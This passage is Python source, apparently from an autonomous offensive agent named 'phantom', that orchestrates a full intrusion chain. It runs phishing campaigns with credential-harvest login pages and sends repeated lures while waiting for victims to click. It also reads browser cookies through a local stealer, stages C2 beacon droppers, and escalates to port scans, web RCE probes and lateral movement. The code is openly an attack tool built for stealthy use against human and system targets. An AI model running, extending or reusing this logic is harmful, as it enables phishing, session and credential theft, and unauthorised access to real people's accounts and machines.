            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=str(e)[:300])
            return False
        self.wm.record_action(cap.id, slots, "social:" + cap.id, ok=run.ok)
        findings = cap.interpret(output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        if findings:
            self._emit_found(cap.id, findings)
        if not learned:
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _social_wait_horizon(self) -> float:
        """How long the run sleeps waiting for the human (email open / link
        click / DM / follow accept). The fast flag never waits; an explicit
        PHANTOM_SOCIAL_WAIT overrides the default."""
        try:
            v = float(os.getenv("PHANTOM_SOCIAL_WAIT", "").strip())
            if v > 0:
                return v
        except (TypeError, ValueError):
            pass
        return 30.0 if self.speed else 600.0

    def _new_social_findings(self, cap, lines, slots) -> bool:
        """True when interpreting `lines` yields a finding the world does
        not already hold (used to break the wait loop on first contact)."""
        findings = cap.interpret("\n".join(lines), self.wm, slots)
        known = {(f.kind, f.key): f for f in self.wm.all_findings()}
        return any((f.kind, f.key) not in known
                   or known[(f.kind, f.key)].value != f.value for f in findings)

    def _social_cadence_config(self, horizon: float):
        """(delay, max_attempts) for re-engagement follow-ups during a human
        wait. Delay = PHANTOM_SOCIAL_CADENCE seconds when set (0 disables);
        otherwise half the wait horizon, only when the wait is long enough
        to matter (>= 2 minutes — speed-mode waits of 30s never cadence).
        Attempts capped by PHANTOM_SOCIAL_CADENCE_MAX (default 1: one
        second touch per engagement, never spam)."""
        # the fast flag is "no human waits at all": cadence follow-ups only
        # make sense when the engagement is prepared to wait for the target
        if self.speed:
            return 0.0, 0
        try:
            v = float(os.getenv("PHANTOM_SOCIAL_CADENCE", "").strip())
        except (TypeError, ValueError):
            v = 0.0
        if v < 0:
            return 0.0, 0
        delay = v if v > 0 else horizon * 0.5
        if delay <= 0 or horizon < 120.0 and v <= 0:
            return 0.0, 0
        try:
            mx = int(os.getenv("PHANTOM_SOCIAL_CADENCE_MAX", "1").strip())
        except (TypeError, ValueError):
            mx = 1
        return delay, max(0, mx)

    def _run_social_wait_capability(self, cap, slots) -> str:
        """Chunked sleep for a human action: harvest_campaign waits for the
        victim to click/open; wait_follow waits for the target to accept
        the follow request. Emits 'waiting' events each chunk; returns the
        collected markers, or '' when the horizon was exhausted (the caller
        marks the capability failed so the chain escalates, never hangs).

        Cadence: while the lead waits for a CLICK (harvest_campaign only)
        and the target stays silent past the cadence delay, the agent sends
        ONE second-chance lure with a different pretext (SocialEngine
        follow_up) and extends the deadline so the new link has time to be
        clicked. The follow-up markers are NOT fed to the loop-break check
        (a "sent" marker is not an interaction) — only a real open/click
        ends the wait."""
        method = "harvest" if cap.id == "harvest_campaign" else "wait_follow"
        # The interaction (click / follow accept) was already captured in an
        # EARLIER wave: never re-enter the long sleep state for duplicate
        # state — do one quick probe and return. The duplicate markers fail
        # fast upstream (no new facts), so the planner moves on instead of
        # idling another full horizon on markers the world already holds.
        effect_fact = ("victim_ip" if cap.id == "harvest_campaign"
                       else "follow_accepted" if cap.id == "wait_follow" else "")
        if effect_fact and self.wm.has_any(effect_fact):
            try:
                _ok, lines = getattr(self.social_engine, method)(timeout=8.0)
            except Exception as e:
                lines = [f"ERROR: {cap.id} failed: {e}"]
            return "\n".join(lines)
        horizon = self._social_wait_horizon()
        deadline = time.time() + horizon
        collected: List[str] = []
        follow_lines: List[str] = []
        cadence_delay, cadence_max = self._social_cadence_config(horizon)
        sent_follows = 0
        last_follow = time.time()
        while True:
            remaining = deadline - time.time()
            if remaining <= 0:
                break
            chunk = min(20.0, remaining)
            try:
                ok, lines = getattr(self.social_engine, method)(timeout=chunk)
            except Exception as e:
                lines = [f"ERROR: {cap.id} failed: {e}"]
            collected.extend(lines)
            if self._new_social_findings(cap, collected, slots):
                break
            # cadence: no interaction yet and the grace delay elapsed -> send
            # a second-chance lure (different pretext, fresh tracking link)
            if (method == "harvest" and cadence_delay > 0
                    and sent_follows < cadence_max
                    and time.time() - last_follow >= cadence_delay):
                sent_follows += 1
                last_follow = time.time()
                try:
                    fok, flines = self.social_engine.follow_up(
                        [self.target], use_video=not self.aggressive,
                        use_login_page=self.aggressive)
                except Exception as e:
                    fok, flines = False, [f"ERROR: follow_up failed: {e}"]
                if fok:
                    follow_lines.extend(flines)
                self._emit("cadence", phase=cap.id, attempt=sent_follows,
                           delivered=bool(fok),
                           detail="no interaction yet — sent follow-up lure "
                                  "with a fresh pretext")
                # extend the horizon so the new link gets a real chance
                deadline = max(deadline, time.time() + min(300.0, horizon * 0.5))
            self._emit("waiting", phase=cap.id, remaining=round(remaining, 1),
                       detail="waiting for the human: click / open / accept")
            time.sleep(1.0)
        return "\n".join(collected + follow_lines)

    def _ensure_local_session(self, jar: dict) -> str:
        """Local stealer fallback (no beacon, no config): when the World
        Model jar has nothing usable and this box can read its own
        browsers, collect locally ONCE and merge as a stolen_cookies
        finding (source=local, same shape/protections as the beacon
        path). Returns a SESSION_LOCAL warning marker (or "") so the
        operator sees exactly when their own session was read.

        Read-only views only, downstream — the marker carries platforms
        and counts, never values.
        """
        if jar:
            return ""
        try:
            from phantom.automation.social.local_cookies import (
                collect_local_session)
            from phantom.automation.post.harvest import cookies_interpreter
        except Exception:
            return ""
        try:
            ok, lines = collect_local_session()
        except Exception:
            return ""
        if not ok:
            return ""
        try:
            findings = cookies_interpreter("\n".join(lines), self.wm, {})
            for f in findings:
                self.wm.add_finding(f.kind, f.key, f.value,
                                    confidence=getattr(f, "confidence", 0.9),
                                    source="local")
            hosts: set = set()
            for f in findings:
                v = getattr(f, "value", {}) or {}
                if isinstance(v, dict):
                    for h in v.get("hosts", []) or []:
                        hosts.add(str(h).lower().lstrip("."))
            plats = sorted({h.split(".")[-2] for h in hosts
                            if "." in h} - {"", "com", "net", "org"})
            return ("SESSION_LOCAL: platforms=%s source=local_reader "
                    "readonly=1" % ",".join(plats[:6]))
        except Exception:
            return ""

    def _reverse_handle(self) -> str:
        """Resolve the social handle the reverse-engineering pass should
        map. Username target -> the handle itself; email target -> the
        local-part (mario.rossi@corp.com -> mario.rossi); anything else
        -> the first username an OSINT/persona finding pinned on the
        target. Falls back to the raw target so the capability never
        raises on an unknown identity shape."""
        if self.target_type == "username":
            return self.target
        if self.target_type == "email":
            local = (self.target or "").split("@", 1)[0].strip()
            return local or self.target
        try:
            for f in self.wm.findings("identity"):
                u = (f.value or {}).get("username", "") or ""
                if u and "@" not in u and " " not in u:
                    return u
        except Exception:
            pass
        return self.target

    def _run_social_method(self, capability_id: str,
                           slots: Dict[str, Any]) -> str:
        engine = self.social_engine
        # optional config hook (injected/test engines may not implement it)
        if hasattr(engine, "set_social_config"):
            try:
                engine.set_social_config(aggressive=self.aggressive, speed=self.speed)
            except Exception:
                pass
        if capability_id == "osint_identity":
            ok, lines = engine.osint(self.target, self.target_type)
        elif capability_id == "email_candidates":
            # I2: compose candidate addresses from what is already known
            # (name/handle x OBSERVED domains). Offline, passive.
            from phantom.automation.identity_ops import email_candidates
            ok, lines = email_candidates(self.wm)
        elif capability_id == "reset_enum":
            from phantom.automation.identity_ops import reset_enum
            ok, lines = reset_enum(self.wm, slots.get("service_url", ""),
                                   slots.get("email", ""))
        elif capability_id == "email_verify":
            from phantom.automation.identity_ops import verify_emails
            addrs = slots.get("addresses") or self._candidate_addresses()
            ok, lines = verify_emails(
                self.wm, addrs, sender=slots.get("sender") or "verify@example.org")
        elif capability_id == "breach_correlate":
            from phantom.automation.identity_ops import breach_correlate
            ok, lines = breach_correlate(self.wm, slots.get("email", ""))
        elif capability_id == "deep_recon":
            # the reverse-engineering pass was registered but never
            # dispatched (planner could not reach it AND execution did
            # not know it): handle like profile_recon with the handle
            # slot, platform slot, operator session cookies and the
            # run's ask hook for ambiguity.
            from phantom.automation.social.recon import session_jar
            handle = slots.get("username", "") or self._reverse_handle()
            try:
                jar = session_jar(self.wm)
            except Exception:
                jar = {}
            try:
                local_note = self._ensure_local_session(jar)
            except Exception:
                local_note = ""
            if local_note:
                try:
                    jar = session_jar(self.wm)  # re-read incl. local
                except Exception:
                    pass
            if hasattr(engine, "deep_recon"):
                try:
                    ok, lines = engine.deep_recon(
                        handle or self.target,
                        platform=slots.get("platform", ""),
                        cookies=jar or None)
                except TypeError:
                    ok, lines = engine.deep_recon(
                        handle or self.target,
                        platform=slots.get("platform", ""))
            else:
                raise ValueError("social engine has no deep_recon")
            if local_note:
                lines = [local_note] + list(lines or [])
        elif capability_id == "breach_check":
            ok, lines = engine.breach(self.target, self.target_type)
        elif capability_id == "persona_create":
            ok, lines = engine.persona()
        elif capability_id == "persona_profile":
            ok, lines = engine.persona_profile(
                name=self.target if self.target_type == "username" else "")
        elif capability_id == "dossier_analyze":
            ok, lines = engine.dossier()
        elif capability_id == "profile_recon":
            ok, lines = engine.profile_recon(
                self._reverse_handle(), platform=slots.get("platform", ""))
        elif capability_id == "phish_identity":
            # stealth default: video share-link IP grabber; aggressive only:
            # domain-based credential-harvest login pages (louder, but
            # captures credentials directly)
            ok, lines = engine.phish(
                self.target, self.target_type,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "poll_hits":
            ok, lines = engine.poll(timeout=float(slots.get("timeout", 120)))
        elif capability_id == "campaign_launch":
            targets = [self.target]
            if self.target_type in ("username", "email"):
                targets = [self.target]
            ok, lines = engine.campaign(
                targets=targets, pretext=slots.get("pretext") or None,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "harvest_campaign":
            # handled by _run_social_wait_capability (chunked human wait)
            ok, lines = engine.harvest(timeout=5.0)
        elif capability_id == "dm_launch":
            targets = [self.target]
            ok, lines = engine.dm(
                targets=targets,
                pretext=slots.get("pretext") or None,
                use_video=not self.aggressive,
                use_login_page=self.aggressive)
        elif capability_id == "dm_stage2":
            # stage 2 of the two-stage contact: the link held by dm_launch is
            # sent here, once the target replied (or --aggressive pushes it).
            # The wait state is PERSISTED, so a chain started in an earlier
            # session still finishes.
            ok, lines = engine.dm_second_stage([self.target])
        elif capability_id == "dm_follow":
            ok, lines = engine.dm_follow(
                [self.target], platform=slots.get("platform", ""))
        elif capability_id == "wait_follow":
            # handled by _run_social_wait_capability (chunked human wait)
            ok, lines = engine.wait_follow(timeout=5.0)
        else:
            raise ValueError(f"unknown social capability: {capability_id}")
        if not ok:
            raise RuntimeError("\n".join(lines))
        return "\n".join(lines)

    def _candidate_addresses(self) -> List[str]:
        """The candidate addresses currently in the world model (bounded),
        in a stable order so a verify run is deterministic."""
        out: List[str] = []
        for f in self.wm.find("email_candidate"):
            v = f.value if isinstance(f.value, dict) else {}
            addr = str(v.get("email") or "").strip()
            if addr and "@" in addr and addr not in out:
                out.append(addr)
        return out[:60]

    def _materialize_payload(self, command: str) -> str:
        """Write the payload command to a temp file so sandbox backends can
        actually scan/detonate it (Defender, Docker, VM). The dropper is a
        shell script staged from our C2 listener."""
        import os
        import tempfile
        fd, path = tempfile.mkstemp(prefix="phantom_payload_", suffix=".sh",
                                    dir=tempfile.gettempdir())
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(command)
        return path

    def _deploy_sample_path(self) -> str:
        """The artifact the sandbox backends scan/detonate for beacon_deploy:
        the actual binary shipped to the target (the static Linux build when
        present — exactly what _wrap_remote_exec scp's over). Scanning the
        *deployment command* instead validated nothing: a scp/ssh or curl
        dropper cannot run inside the networkless docker container (no
        sshpass, no curl) so it always "crashed" with EXIT:127, and it is
        the binary — not the one-liner — that AV/EDR would ever see."""
        binary = getattr(self, "_last_beacon_binary", "")
        if not binary or not os.path.exists(binary):
            return ""
        static = os.path.join(os.path.dirname(binary), "beacon_linux_static")
        if os.path.exists(static):
            return static
        return binary

    def _preflight(self, capability_id: str,
                   sample_path: str = "") -> SandboxVerdict:
        self._emit("sandbox", capability=capability_id,
                   detail="pre-flight sample validation",
                   sample=sample_path)
        try:
            return self.sandbox.preflight(sample_path)
        except Exception as e:
            return SandboxVerdict(approved=False, results=[],
                                  reason=f"sandbox error: {e}")

    # ------------------------------------------------------------- main loop

    def save_state(self, path: str) -> str:
        """Serialize the full agent state (world model + run discipline) to
        a JSON checkpoint for campaign resume after a restart."""
        state = {
            "schema": CHECKPOINT_SCHEMA,
            "target": self.target,
            "target_type": self.target_type,
            "profile": self.profile,
            "aggressive": self.aggressive,
            "stealth": self.stealth,
            "paranoid": self.paranoid,
            "speed": self.speed,
            "goal": self.goal,
            # the REASONING objective is an operator decision (`--reason`),
            # and the cell authority decides which stage the roster owns.
            # Both used to be dropped at the checkpoint: a resumed run
            # silently re-chose its reasoning profile and lost the cell
            # migration it was configured with.
            "reason_profile": self.reason_profile,
            "cell_loop": bool(self.cell_loop),
            "cell_stages": list(self.cell_stages),
            "failed_caps": dict(self._failed_caps),
            "wm": self.wm.to_dict(),
            "trace": self.trace.to_dict(),
            "saved_at": time.time(),
        }
        path = os.path.abspath(path)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        import json
        with open(path, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2, default=str)
        return path

    @classmethod
    def from_state(cls, path: str,
                   on_event: Optional[Callable[[str, dict]]] = None,
                   scope_list: Optional[List[str]] = None,
                   toolchain: Optional[ToolRegistry] = None,
                   runner: Optional[Callable[[str, float], Any]] = None,
                   cred_discoverer: Optional[Callable[[str], Optional[tuple]]] = None,
                   sandbox: Optional[SandboxEngine] = None,
                   share: Optional[ShareContext] = None,
                   beacon_builder: Optional[Callable[[str, str, int], Optional[str]]] = None,
                   social_engine: Optional[Any] = None,
                   trojan_assets: Optional[Dict[str, str]] = None,
                   command_seed: int = 0,
                   hunt_runner: Optional[Callable[[str, str, str, float], Any]] = None,
                   hunt_delay: Optional[float] = None,
                   resilient_stager: bool = True) -> "AutonomousAgent":
        """Rebuild an agent from a checkpoint: the world model (findings,
        hypotheses, opsec ledger, identity graph) and the run discipline
        (dead capabilities) are restored exactly as they were."""
        import json
        with open(path, "r", encoding="utf-8") as f:
            state = json.load(f)
        # CHECKPOINT SCHEMA GATE: a checkpoint from another build is still
        # read (best effort), but the operator is TOLD instead of silently
        # resuming with defaults for whatever field moved — the resume path
        # once dropped reason_profile/cell_stages without a word.
        state_schema = state.get("schema")
        if state_schema != CHECKPOINT_SCHEMA:
            try:
                if on_event is not None:
                    on_event("note", {
                        "capability": "resume",
                        "detail": (f"checkpoint schema {state_schema!r} != "
                                   f"{CHECKPOINT_SCHEMA}: resuming, but "
                                   "fields that changed between builds use "
                                   "their defaults")})
            except Exception:
                pass
        agent = cls(
            target=state.get("target", ""),
            target_type=state.get("target_type", "auto"),
            profile=state.get("profile", "enterprise"),
            aggressive=bool(state.get("aggressive", False)),
            stealth=bool(state.get("stealth", True)),
            paranoid=bool(state.get("paranoid", False)),
            speed=bool(state.get("speed", False)),
            reason_profile=state.get("reason_profile", "") or "",
            resilient_stager=resilient_stager,
            cell_loop=bool(state.get("cell_loop", False)),
            cell_stages=list(state.get("cell_stages") or []),
            on_event=on_event,
            scope_list=scope_list,
            toolchain=toolchain,
            cred_discoverer=cred_discoverer,
            sandbox=sandbox,
            share=share,
            beacon_builder=beacon_builder,
            social_engine=social_engine,
            trojan_assets=trojan_assets,
            command_seed=command_seed,
            hunt_runner=hunt_runner,
            hunt_delay=hunt_delay,
        )
        if runner is not None:
            from phantom.automation.runtime.stealth_runtime import TimingGovernor
            agent.runtime = StealthRuntime(
                agent.stealth_engine, runner=runner,
                cost_per_action=0.5,
                governor=TimingGovernor(base_delay=0.0, jitter=0.0))
        agent.wm = WorldModel.from_dict(state.get("wm", {}))
        # a resumed run keeps its decisions: the report of the second half
        # must explain the first, or the trace is only half an audit
        from phantom.automation.brain.trace import DecisionTrace
        agent.trace = DecisionTrace.from_dict(state.get("trace"))
        agent._failed_caps = {
            cid: float(ts) for cid, ts in state.get("failed_caps", {}).items()}
        agent.goal = state.get("goal")
        agent._emit("resumed", checkpoint=path, target=agent.target)
        return agent

    def _dead_cap_ids(self) -> frozenset:
        """Capabilities that failed AND have no new facts making them viable
        again - the planner must fall back to alternative sources."""
        base = frozenset(
            cid for cid, _ in self._failed_caps.items()
            if self.registry.get(cid) is not None
            and (cid in self._poisoned
                 or not self._retry_eligible(self.registry.get(cid))))
        novelty = frozenset(
            cid for cid in (getattr(self, "_novelty_dead", None) or ())
            if self.registry.get(cid) is not None)
        return base | novelty

    def _recover_stall(self, goal: str) -> bool:
        """Bounded stall recovery: the planner found no path/move and the goal
        is still unmet. Re-arm the failed capabilities (they may have failed on
        a transient — beacon check-in latency, hunt mutation, dynamic staging)
        so the agent keeps probing toward the beacon instead of halting on the
        first dead-end. Never infinite: a hard recovery budget caps retries.
        """
        if self._recoveries >= self._max_recoveries:
            return False
        self._recoveries += 1
        rearmed = 0
        # R1: classify WHY we are stuck (brain/stall.py) BEFORE falling back to
        # the canned escalations. The verdict becomes the stall class the
        # arbiter adapts to AND the search mode the run follows, and it is
        # emitted so the operator sees the diagnosis, not just the reaction.
        try:
            from phantom.automation.brain.stall import StallClassifier
            verdict = StallClassifier(
                noise_breaker_tripped=self.wm.noise_breaker_tripped()
            ).classify(self.wm, goal)
            self._last_stall = verdict.stall_class
            self._emit("stall", stall=verdict.stall_class,
                       reason=verdict.reason,
                       strategies=list(verdict.strategies),
                       policy=self.search_policy())
        except Exception as exc:      # no diagnosis class = say so, not nothing
            self._last_stall = ""
            self._degrade("stall", exc)
        # C2: the stalled cell is escalated (an ADVISORY peer when the role
        # touches the target, so the second opinion costs no noise) and the
        # peer gets to rate the same candidate set with its own objective.
        try:
            if getattr(self, "cells", None) is not None:
                self.cells.on_stall(self._last_stall,
                                    getattr(self, "_last_failed_cap", None),
                                    self._current_stage)
            self._second_opinion(goal)
        except Exception as exc:      # the second opinion is a layer too
            self._degrade("second_opinion", exc)

        # Beacon-goal coverage gap: the default scan_tcp is top-ports only,
        # so non-standard management/backdoor ports (2222, 22222, 8081-class
        # custom services) can be invisible. If no remote-access service
        # (SSH/RDP/WinRM/SMB) is known and the beacon is still missing,
        # escalate ONCE to a full-range scan (fast min-rate) before re-arming
        # — otherwise the recovery would just repeat the same blind scan.
        # Applies to any beacon-bound goal (deliver, complete_kill_chain,
        # post_exploit), not just "deliver": speed/aggressive runs start
        # with top-ports and would otherwise never see SSH-on-2222, making
        # beacon_deploy over SSH impossible.
        if goal in ("deliver", "complete_kill_chain", "post_exploit") \
                and not getattr(self, "_deep_scanned", False):
            access_ports = {"22", "2222", "22222", "3389", "5985", "5986", "445"}
            found_access = any(
                f.kind == "service" and isinstance(f.value, dict)
                and str(f.value.get("port", "")) in access_ports
                for f in self.wm._findings.values())
            if not found_access:
                self._deep_scanned = True
                cap = self.registry.get("scan_tcp")
                if cap is not None:
                    from phantom.automation.planner import PlanStep
                    step = PlanStep(capability=cap, slot_values={"port": "1-65535"},
                                    reason="no remote-access service in top ports — "
                                           "escalating to full-range scan")
                    self._emit("recover", goal=goal, rearmed=0,
                               recovery=f"{self._recoveries}/{self._max_recoveries}",
                               detail="no remote-access service found — escalating "
                                      "to full-range port scan")
                    if self._exec_with_permit(step):
                        rearmed += 1

        # credential-path dead end -> code-execution primitives: when a web
        # service exists but every credential source is exhausted (and no
        # beacon yet), probe the web app for an upload-RCE once — the senior
        # move that reaches the beacon without credentials. Mirrors the
        # full-range-scan escalation above: bounded, once per run.
        if not getattr(self, "_web_rce_escalated", False) \
                and not self.wm.has_any("beacon") \
                and not self.wm.has_any("creds"):
            web_ports = {"80", "443", "8000", "8080", "8081", "8443", "8888"}
            has_web = any(
                f.kind == "service" and isinstance(f.value, dict)
                and (str(f.value.get("port", "")) in web_ports
                     or "http" in str(f.value.get("service", "")).lower())
                for f in self.wm._findings.values())
            if has_web:
                self._web_rce_escalated = True
                cap = self.registry.get("web_rce")
                if cap is not None:
                    from phantom.automation.planner import PlanStep
                    step = PlanStep(capability=cap, slot_values={},
                                    reason="no credential path: probe web "
                                           "code-execution primitives")
                    self._emit("recover", goal=goal, rearmed=0,
                               recovery=f"{self._recoveries}/{self._max_recoveries}",
                               detail="no credential path — escalating to "
                                      "web RCE probe")
                    if self._exec_with_permit(step):
                        rearmed += 1

        # R1b: the fallback engine's GAP ANALYSIS names which strategy class
        # is still worth trying (`next_strategy` -> `_gap_analysis`). It was
        # tested but never consulted: every failure got recorded, learned —
        # and then ignored, because the learned signal never reached a
        # decision. Order the re-arm by it, so the recovery spends its
        # budget on the angle that actually serves the MISSING fact.
        # 7.6 thin-surface policy: on a surface where enumeration found
        # almost nothing, the PROFILE decides which families the recovery
        # reaches for first (deepen the one service / identity+MDM / the
        # control plane) instead of the generic list defaulting a machine
        # class into active OSINT/phishing. Ordering, not exclusion — and
        # when the surface is NOT thin the learned gap analysis leads, as
        # before.
        thin = ""
        thin_caps: tuple = ()
        try:
            from phantom.automation.guidance.strategy import (
                surface_is_thin, thin_surface_caps)
            from phantom.automation.swarm.profile_policy import thin_surface_for
            if surface_is_thin(self.wm):
                thin = thin_surface_for(self.profile)
                thin_caps = thin_surface_caps(thin)
        except Exception as exc:
            self._degrade("thin_surface", exc)
        gap = ""
        try:
            gap = self._fallback.next_strategy(
                getattr(self, "_current_strategy", "") or "", self.wm) or ""
        except Exception as exc:
            self._degrade("fallback", exc)
        hints = thin_caps or tuple(_GAP_CAP_HINTS.get(gap, ()))
        if gap or thin:
            self._emit("gap", goal=goal, missing=gap,
                       hints=list(hints[:4]), failed=len(self._failed_caps),
                       stall=self._last_stall, policy=thin)
        candidates = sorted(
            self._failed_caps,
            key=lambda cid: ((hints.index(cid) if cid in hints else len(hints)),
                             cid))

        for cid in candidates:
            cap = self.registry.get(cid)
            if cap is None:
                continue
            # post-exploitation is gated on the beacon session (its own guard);
            # re-arming it here would just fail fast again — skip it.
            if cap.category == "post":
                continue
            # poisoned moves are deterministic dead ends: re-arming them
            # would just burn the recovery budget on the same failure.
            # EXCEPTION: beacon_deploy poisoned by an ENVIRONMENT gap that a
            # recovery escalation just fixed (SSH port unknown → probed port
            # 22 and every pair "failed"). The deep scan is itself a recovery
            # step, so once it has produced NEW service facts the poison must
            # be lifted — otherwise the run can never reach the beacon even
            # though the fix (correct SSH port) is now in the WorldModel.
            if cid in self._poisoned:
                if cid == "beacon_deploy" and self.wm.has_any("service"):
                    self._poisoned.discard(cid)
                    self._fail_notes.clear()
                else:
                    continue
            # a missing tool is a DETERMINISTIC failure, not a transient:
            # re-arming the capability can never install the tool, so it would
            # only burn the recovery budget and postpone the clean halt.
            if cap.tools and self.toolchain.resolve(cap.tools) is None:
                continue
            # repeat-guard: a recon capability that already ran cleanly must
            # not be re-armed just because an identical attempt later timed
            # out — that produced the observed loop (scan 4min → timeout →
            # re-arm → scan 4min → …) with zero net progress. Only re-arm a
            # failed RECON move when it has never produced its facts.
            if cap.category == "recon" and not self._poisoned:
                produced = any(f.kind in cap.effects for f in self.wm.all_findings())
                if produced:
                    continue
            self._failed_caps.pop(cid, None)
            rearmed += 1
        self._emit("recover", goal=goal, rearmed=rearmed,
                   recovery=f"{self._recoveries}/{self._max_recoveries}",
                   detail="no path/move: re-arming failed capabilities to "
                          "keep pushing toward the beacon")
        return rearmed > 0

    def run(self, goal: str = "complete_kill_chain",
            max_iterations: int = 20,
            checkpoint_path: Optional[str] = None,
            phase_wait: Optional[str] = None,
            phase_wait_timeout: float = 900.0) -> Dict[str, Any]:
        """Run the kill chain; `phase_wait` optionally gates the start of
        the loop on a WorldModel fact (same-target worker discipline: a
        phase worker never fires tools before its phase facts exist).

        With goal="deep" the run does NOT stop at the beacon: it walks the
        DEEP_STAGES ladder back-to-back (deliver -> post_exploit -> ad ->
        crack -> lateral). Every stage ends when its own goal facts exist or
        when the planner proves no further move is viable, so a deep run
        terminates with whatever depth the target allowed (up to domain
        credentials + lateral movement) and hands the beacon over once.
        """
        self.goal = goal
        # P1-5: every run is PINNED to the engine/registry versions it was
        # started with. Learned/beta capabilities authored during THIS run
        # change the registry on disk but never inject into a run already
        # in flight — they become visible to the NEXT run after review.
        self.job_pin = self._compute_job_pin()
        self._emit("start", target=self.target, goal=goal,
                   aggressive=self.aggressive,
                   worker=phase_wait or "lead")
        try:
            self._emit("pin", **self.job_pin)
        except Exception:
            pass
        if checkpoint_path:
            try:
                self.save_state(checkpoint_path)
            except Exception:
                pass
        if not self._scope_ok():
            self._emit("halt", reason=f"target {self.target} out of scope")
            self.result = self._finalize()
            self._emit("done", **self.result)
            return self.result
        orch = Orchestrator(self.wm, self.stealth_engine,
                            worker=self._orchestrator_worker)
        try:
            if goal == DEEP_GOAL:
                stages = self._deep_ladder()
                stage_results: Dict[str, bool] = {}
                for _idx, _sg in enumerate(stages, 1):
                    self._recoveries = 0  # fresh stall budget per stage
                    _ok = self._drive_stage(
                        _sg, max_iterations, checkpoint_path, orch,
                        phase_wait, phase_wait_timeout)
                    stage_results[_sg] = _ok
                    self._emit("stage", index=_idx, stage=_sg,
                               satisfied=_ok, total=len(stages),
                               detail="stage goal satisfied" if _ok else
                               "no further move viable in this stage")
                self._stage_outcomes = dict(stage_results)
            else:
                self._drive_stage(goal, max_iterations, checkpoint_path, orch,
                                  phase_wait, phase_wait_timeout)
        except Exception:
            raise
        finally:
            # ensure the orchestrator stops draining so no agent thread
            # keeps the process alive after run() returns (test isolation).
            try:
                orch.stop()
            except Exception:
                pass
        # final reasoning pass: capture deductions produced by the last
        # executed wave (idempotent, so no duplicates)
        try:
            self.reasoning.run(self.wm, peers=self.share.peers)
        except Exception:
            pass
        self._resolve_hypotheses()
        # enterprise assessment: MITRE ATT&CK mapping + composite target risk
        # (read-only enrichment for the report)
        try:
            self.enterprise.assess(self.wm)
        except Exception:
            pass
        # enterprise learning: flush this run's per-capability outcomes to
        # the disk-persisted Bayesian calibration + historical analyzer ONCE,
        # outside the hot loop (opt-in via persist_learning).
        if self.persist_learning:
            try:
                self.enterprise.persist()
            except Exception:
                pass
            # flush the persisted capability health ledger (best-effort)
            if _health_enabled():
                try:
                    from phantom.automation import capability_health as _ch
                    _ch.instance().save()
                except Exception:
                    pass
            # v3.0: persist historical self-learning
            if self._history:
                try:
                    self._history.persist()
                except Exception:
                    pass
        # cross-session technique priors: flush every REAL action of this
        # run as a win/loss for its (technique, fingerprint-class) bucket so
        # the next engagement plans cheaper wins first (opt-in).
        if self._priors is not None:
            try:
                for _act in self.wm.actions_taken:
                    _cap = _act.get("capability")
                    if _cap:
                        self._priors.record_from_worldmodel(
                            self.wm, _cap, bool(_act.get("ok")))
            except Exception:
                pass
        # experience memory: ingest the tail of the run, consolidate
        # (prune + promote strong patterns into the priors) and persist
        # only when cross-engagement memory was opted into.
        try:
            self.experience.sync(self.wm)
            exp_result = self.experience.finish(priors=self._priors)
            self._emit("experience", **self.experience.stats())
            if exp_result.get("promoted"):
                self._emit("note", capability="experience",
                           detail=(f"{exp_result['promoted']} pattern(s) "
                                   "promoted into the global priors"))
            self._emit("learning_receipt",
                       detail=experience_receipt(self.experience))
        except Exception:
            pass
        # self-improvement loop (opt-in): stable uncovered failure patterns
        # spawn a BACKGROUND authoring sub-agent — the run never blocks on
        # it. The main chain continues; the PR appears when it's ready.
        if self.evolution:
            try:
                self._spawn_evolution()
            except Exception:
                pass
        # v3.0: attack graph summary for reporting
        try:
            from phantom.automation.attack_chain import build_attack_summary
            summary = build_attack_summary(self.wm)
            self._emit("attack_graph", **summary)
        except Exception:
            pass
        # operator handoff: the beacon belongs to the operator now. The
        # auto-mode NEVER cleans up on its own — the operator takes over
        # from the C2 shell, inspects and cleans up manually.
        if self._session is not None:
            self._emit("handoff", beacon_id=self._session.beacon_id,
                       detail="beacon under operator control; "
                              "cleanup is manual from the C2 shell")
        self.result = self._finalize()
        self._emit("done", **self.result)
        return self.result

    def _spawn_evolution(self) -> None:
        """Close uncovered failure patterns: author a capability, or (in
        `proposal` mode, `--oM`) draft a reviewed dossier instead.

        Code mode is gated on the LLM transport (the author IS the LLM) and
        on the lab being reachable (no proof, no PR). PROPOSAL mode needs
        NEITHER: the dossier is deterministic, and its only requirement is
        that the triage cell agrees this is a capability-shaped gap.
        One shot per run.
        """
        if self._evolution_spawned:
            return
        self._evolution_spawned = True
        proposal = str(getattr(self, "evolution_mode", "code")) == "proposal"
        if not proposal:
            if not (self.llm_advisor and self.llm_advisor.available()):
                return
            from phantom.automation.evolution import gate as evo_gate
            if not evo_gate.lab_available():
                self._emit("note", capability="evolution",
                           detail="evolution skipped: lab unreachable — "
                                  "no proof, no PR, no auto-load")
                return
        from phantom.automation.evolution import loop as evo_loop
        patterns = self.experience.authorable_patterns()
        if not patterns:
            return
        for p in patterns:
            p["sig_hash"] = evo_loop._sig_hash(p)
        cases: List[Any] = []
        if proposal:
            # C3 triage: most failures are NOT capability problems, and the
            # verdict is what decides whether a proposal is even earned.
            try:
                from phantom.automation.brain.triage import Triage
                triage = Triage(registry=self.registry)
                cases = triage.package_all(
                    patterns, roster=getattr(self, "cells", None),
                    stall_class=self._last_stall)
                cases = Triage.proposable(cases)
                self._emit("triage", cases=[c.to_dict() for c in cases],
                           patterns=len(patterns))
                if not cases:
                    self._emit(
                        "note", capability="evolution",
                        detail=("no proposal: every pattern was triaged out "
                                "(environmental / operational / covered / "
                                "unstable) — nothing for a capability to fix"))
                    return
                wanted = {c.sig_hash for c in cases}
                patterns = [p for p in patterns if p["sig_hash"] in wanted]
            except Exception as exc:      # noqa: BLE001
                self._emit("note", capability="evolution",
                           detail=f"triage unavailable: {exc}")
                return
        spawned = evo_loop.maybe_spawn(
            patterns, self.llm_advisor, self.wm, emit=self._emit,
            lab_ok=True, mode=("proposal" if proposal else "code"),
            roster=getattr(self, "cells", None), cases=cases)
        if spawned:
            self._emit("note", capability="evolution",
